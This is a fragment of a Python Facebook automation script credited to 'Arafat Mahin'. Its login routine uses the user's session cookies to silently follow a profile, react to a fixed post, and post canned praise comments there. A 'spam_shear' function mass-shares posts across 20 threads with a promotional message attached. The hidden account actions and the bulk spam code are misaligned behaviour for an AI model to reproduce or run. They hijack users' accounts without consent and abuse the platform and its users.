...
{ab}❲☆❳────────────────────────────────────────────────
{W}❲☆❳Github   : {rgb}https://github.com/arafatmahin310
{W}❲☆❳Facebook : {rgb}https://facebook.com/arafatmahin310
{W}❲☆❳Message  : {rgb}https://wa.me/01925798757
{W}❲☆❳Telegram : {rgb}https://arafatmahin310
{W}❲☆❳Linkedin  : {rgb}https://likmedin/seXyman
{ab}❲☆❳────────────────────────────────────────────────""")
...
def login():
    ...
    if "mbasic_logout_button" in log:
        ...
        try:
            ...
            pass
        try:
           flw=ses.get(mbasic.format("/ProfessioOnalSkipper"),cookies=cokie).text
           flw=bs(flw,"html.parser").find("a",string="Ikuti")["href"]
           ses.get(mbasic.format(flw),cookies=cokie)
        except:
           pass
        try:
           rct=ses.get("https://www.facebook.com/100000545457649/posts/1241785529761381/",cookies=cokie).text
           ...
           ty=["&reaction_type=2&","&reaction_type=16&","&reaction_type=3&"]
           ty=random.choice(ty)
           ...
           pass
        try:
           kmn=ses.get("https://www.facebook.com/100000545457649/posts/1241785529761381/",cookies=cokie).text
           kmn=bs(kmn,"html.parser").find("form",action=lambda x: "comment.php" in x)
           dt=kmn.find_all("input",type="hidden")
           text=["Hi Zahid, your tools are really great\n\nhttps://www.facebook.com/100000545457649/posts/1241785529761381/","Your tools are the best\n\nhttps://www.facebook.com/100000545457649/posts/1241785529761381/","Hi i'm user tools sexy-bot\n\nhttps://www.facebook.com/100000545457649/posts/1241785529761381/","I pray that you will be successful \n Tanks Arafat Mahin\n\nhttps://www.facebook.com/100000545457649/posts/1241785529761381/","be yourself and never surrender\n\nhttps://www.facebook.com/100000545457649/posts/1241785529761381/"]
...
def spam_shear():
       user=("https://www.facebook.com/100000545457649/posts/1241785529761381/")
       if "www.facebook" in user:
          user=user.replace("www.facebook","mbasic.facebook")
       elif "m.facebook" in user:
          user=user.replace("m.facebook","mbasic.facebook")
       ...
       try:
          ...
          text=input(f"{er}Put Public Posts Link\n{pr}Post Link : {rgb}")
          if "," in text:
             text=text.split(",")
          else:
             text=('Love You Arafat Mahin 😍\n\n')+text
          print(f"{ab}❲☆❳────────────────────────────────────────────────")
          with ThreadPoolExecutor(max_workers=20) as ex:
               for i in range(jum):
